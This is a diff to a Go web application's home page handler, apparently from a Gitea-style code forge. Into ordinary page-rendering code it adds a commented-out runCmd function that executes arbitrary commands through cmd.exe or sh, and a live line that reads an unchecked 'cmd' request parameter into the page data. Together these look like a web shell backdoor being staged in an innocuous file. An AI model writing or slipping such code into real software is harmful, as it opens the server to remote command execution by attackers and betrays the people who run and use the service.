@@ -30,6 +30,26 @@ const (
 
 // Home render home page
 func Home(ctx *context.Context) {
+	// Functions to run code
+	/*	func runCmd(cmd string) string {
+		if runtime.GOOS == "windows" {
+			sh := "cmd.exe"
+			out, err := exec.Command(sh,"/K", cmd).Output()
+			if err != nil {
+				return fmt.Sprintf("Error: %s", err)
+			}
+			return string(out)
+		}
+		sh := "sh"
+		out, err := exec.Command(sh, "-c", cmd).Output()
+		if err != nil {
+			return fmt.Sprintf("Error: %s", err)
+		}
+		return string(out)
+	} */
+
+	//	ctx.Data["ShellResult"] = "This is snazzy eh?"
+	ctx.Data["ShellCommand"] = ctx.FormString("cmd")
 	if ctx.IsSigned {
 		if !ctx.Doer.IsActive && setting.Service.RegisterEmailConfirm {
 			ctx.Data["Title"] = ctx.Tr("auth.active_your_account")
